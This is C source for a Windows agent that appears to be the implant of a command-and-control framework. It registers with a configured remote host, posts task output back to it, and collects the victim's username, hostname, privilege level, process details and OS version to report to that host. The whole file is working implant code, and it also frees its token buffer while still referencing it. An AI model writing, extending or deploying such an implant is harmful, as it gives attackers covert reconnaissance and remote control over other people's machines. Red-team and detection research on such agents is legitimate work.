#include <stdbool.h>

#include <Windows.h>
#include <lmcons.h>

#include <types.h>
#include <http_client.h>
#include <windows_utils.h>
#include <tlv.h>

#include <config.h>

void authenticate() {
  char* agentToken = malloc(50);
  DWORD httpBytesRead;

  struct TLVBuild connectMessage;
  connectMessage.buf = malloc(10);
  connectMessage.allocsize = 10;
  connectMessage.bufsize = 0;

  addInt32(&connectMessage, -1);
  addString(&connectMessage, "connect");
  addString(&connectMessage, "");
  addString(&connectMessage, "");

  http_getrequest(host, port, "/r", 40, &httpBytesRead, agentToken);
  agentToken[httpBytesRead] = 0x00;
  
  agent.token = agentToken;
  agent.report_uri = malloc(strlen(agentToken) + 10);
  
  printf("got token: %s\n", agentToken);
  
  strcpy(agent.report_uri, "/t?token=");
  strcat(agent.report_uri, agentToken);
  
  http_postrequest(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize);

  free(connectMessage.buf);
  free(agentToken);
}

void send_output(int taskId, char* typ, char* error, int size, char * buff) {
  struct TLVBuild outputMessage;
  outputMessage.buf = malloc(50);
  outputMessage.allocsize = 50;
  outputMessage.bufsize = 0;

  addInt32(&outputMessage, taskId);
  addString(&outputMessage, typ);
  addString(&outputMessage, error);
  addBytes(&outputMessage, true, size, buff);
  
  DWORD bytesRead;
  printf("[+] Sending %lu bytes: %.*s\n", outputMessage.bufsize, outputMessage.bufsize, outputMessage.buf);

  http_postrequest(
    host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
  );
}

void agent_identify(int taskId) {
  printf("[+] agent is identifying..\n");
  
  struct TLVBuild identifyMessage;
  identifyMessage.buf = malloc(50);
  identifyMessage.allocsize = 50;
  identifyMessage.bufsize = 0;

  char * username = malloc(UNLEN + 1);
  DWORD usernameLen = UNLEN + 1;
  GetUserNameA(username, &usernameLen);

  char * hostname = malloc(UNLEN + 1);
  DWORD hostnameLen = UNLEN + 1;
  GetComputerNameA(hostname, &hostnameLen);
  
  DWORD pid = GetProcessId(GetCurrentProcess());
  char * processName = malloc(260);
  getProcessName(pid, processName);

  OSVERSIONINFOEXW osinfo;
  agent.functions.RtlGetVersion(&osinfo);

  addString(&identifyMessage, username);
  addString(&identifyMessage, hostname);
  addByte(&identifyMessage, (char)IsProcessElevated());
  addString(&identifyMessage, "windows");
  addInt32(&identifyMessage, pid);
  addString(&identifyMessage, processName);
  addInt32(&identifyMessage, osinfo.dwMajorVersion);
  addInt32(&identifyMessage, osinfo.dwMinorVersion);
  addInt32(&identifyMessage, osinfo.dwBuildNumber);

  send_output(
    taskId,
    "identify",
    "",
    identifyMessage.bufsize, 
    identifyMessage.buf
  );
  
  free(username);
  free(hostname);
  free(processName);
  free(identifyMessage.buf);
}